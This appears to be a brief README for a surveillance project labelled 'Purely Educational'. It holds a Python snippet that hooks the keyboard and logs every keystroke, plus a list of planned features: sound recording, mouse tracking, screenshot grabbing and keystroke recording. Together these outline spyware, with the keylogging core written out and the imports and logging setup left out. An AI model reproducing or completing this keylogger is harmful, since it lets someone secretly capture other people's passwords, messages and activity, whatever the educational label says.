Purpose of this project is to test the security of computer systems. Purely Educational!

# Code that goes in educational1.py

```py
def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```

- Sound Recorder
- Mouse pointer Recorder
- Screenshot Grabber
- Keystrokes Recorder